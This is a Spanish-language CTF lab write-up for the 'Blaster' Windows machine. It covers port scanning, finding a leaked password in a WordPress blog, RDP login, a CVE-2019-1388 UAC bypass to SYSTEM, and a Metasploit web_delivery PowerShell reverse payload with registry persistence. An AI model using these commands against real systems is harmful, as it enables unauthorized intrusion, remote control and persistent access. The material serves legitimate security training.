# Blaster

Conceptos clave: Web Enumeration, OSINT, RDP, CVE-2019-1388 (UAC Bypass), Metasploit Web Delivery, Fileless Execution, Persistence
Dificultad: Fácil
Fecha: 19 de junio de 2026

## Resumen
Compromiso de la máquina **Blaster** (Windows) combinando técnicas de enumeración web, OSINT y escalada de privilegios gráfica. El acceso inicial se logró descubriendo credenciales ocultas en un blog de WordPress e iniciando sesión vía RDP. Posteriormente, se escaló a `NT AUTHORITY\SYSTEM` explotando la vulnerabilidad **CVE-2019-1388** (Windows Certificate Dialog). Finalmente, se estableció una sesión de Meterpreter mediante un ataque *fileless* (`web_delivery`) y se configuró persistencia en el sistema.

---

## 1. Reconocimiento (Recon)

### 1.1 Escaneo de Puertos
Se inició la fase de reconocimiento comprobando la conectividad e identificando todos los puertos TCP abiertos mediante un escaneo rápido y sigiloso:

```bash
sudo nmap -p- --open --min-rate 5000 -vvv -n -sS -Pn -oN allPorts <IP>
```

**Puertos descubiertos:**
* `80/tcp`: HTTP (Servidor Web)
* `3389/tcp`: RDP (Escritorio Remoto)

### 1.2 Enumeración de Servicios y Versiones
Con los puertos identificados, se lanzó un escaneo exhaustivo para extraer banners y ejecutar scripts básicos de vulnerabilidad:

```bash
nmap -p 80,3389 -sC -sV -oN targeted <IP>
```

### 1.3 Enumeración Web
Al acceder al puerto 80, se observó la página por defecto de IIS. Se procedió a realizar *fuzzing* de directorios para descubrir rutas ocultas:

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
```

**Hallazgo:** Se descubrió el directorio `/retro`, el cual alojaba un blog de WordPress con temática *retro gaming*. 

---

## 2. Acceso Inicial (Initial Access)

### 2.1 OSINT y Credenciales
Revisando las publicaciones del blog en `/retro`, se identificó a un autor llamado `wade`. En uno de sus artículos pasados, el usuario cometió el error de dejar un comentario/pista que revelaba su contraseña: `parzival`.

**Credenciales obtenidas:** `wade` : `parzival`

### 2.2 Conexión RDP
Sabiendo que el puerto 3389 (RDP) estaba abierto, se utilizó el cliente `xfreerdp` para acceder a la máquina con las credenciales descubiertas:

```bash
xfreerdp /u:wade /p:parzival /v:<IP> +clipboard /dynamic-resolution
```

Una vez dentro del entorno gráfico de Windows, se navegó al escritorio del usuario y se obtuvo la primera bandera (`user.txt`).

---

## 3. Escalada de Privilegios (Privilege Escalation)

### 3.1 Identificación del Vector (CVE-2019-1388)
Revisando los archivos recientes y el historial del usuario, se descubrió que había estado investigando el **CVE-2019-1388**, una vulnerabilidad de escalada de privilegios (UAC Bypass) relacionada con el cuadro de diálogo de certificados de Windows.

En el escritorio se encontraba un ejecutable (`hhupd.exe`) vulnerable a este fallo.

### 3.2 Explotación Gráfica
La explotación de esta vulnerabilidad se realizó interactuando con la interfaz gráfica vía RDP:
1. Se ejecutó `hhupd.exe` como administrador, lo que lanzó el prompt del UAC (User Account Control).
2. En lugar de introducir credenciales (que no teníamos para el administrador), se hizo clic en *"Mostrar más detalles"* y luego en *"Mostrar información del certificado"*.
3. Se hizo clic en el enlace del emisor del certificado ("VeriSign Commercial Software...").
4. Esto provocó que el sistema abriera una instancia del navegador Internet Explorer ejecutándose en el contexto de **`NT AUTHORITY\SYSTEM`** (heredado del proceso UAC).
5. Desde el navegador, se fue a *Archivo > Guardar como*, y en la barra del explorador de archivos, se tecleó `cmd.exe` y se ejecutó.

**Resultado:** Se obtuvo una consola de comandos (`cmd`) con privilegios máximos, lo que permitió acceder a `C:\Users\Administrator\Desktop` y leer la bandera `root.txt`.

---

## 4. Post-Explotación y Persistencia

Para asentar el control sobre la máquina y practicar ataques *fileless*, se integró Metasploit en la fase de post-explotación utilizando el módulo `web_delivery`.

### 4.1 Metasploit Web Delivery
Desde la máquina atacante, se preparó un *listener* y un servidor de *payloads*:

```bash
msfconsole
use exploit/multi/script/web_delivery
set target 2  # PowerShell
set payload windows/meterpreter/reverse_http
set LHOST <IP_VPN>
set LPORT 4444
run -j
```

Este módulo generó un comando extenso en PowerShell diseñado para descargar y ejecutar el *payload* en memoria sin escribir en el disco duro.

### 4.2 Ejecución y Persistencia
1. Se copió el comando generado por Metasploit.
2. A través de la conexión RDP (gracias a la opción `+clipboard` de `xfreerdp`), se pegó y ejecutó el comando en la consola `cmd.exe` con privilegios de `SYSTEM` que habíamos obtenido previamente.
3. El *listener* de Metasploit capturó la conexión, devolviendo una sesión.

```meterpreter
sessions 1
```

Finalmente, para asegurar el acceso frente a reinicios, se ejecutó el módulo de persistencia:

```meterpreter
run persistence -X
```

El parámetro `-X` instaló el *payload* en el registro de Windows para que se ejecute automáticamente al arrancar el sistema con privilegios de sistema, finalizando con éxito la auditoría de la máquina.
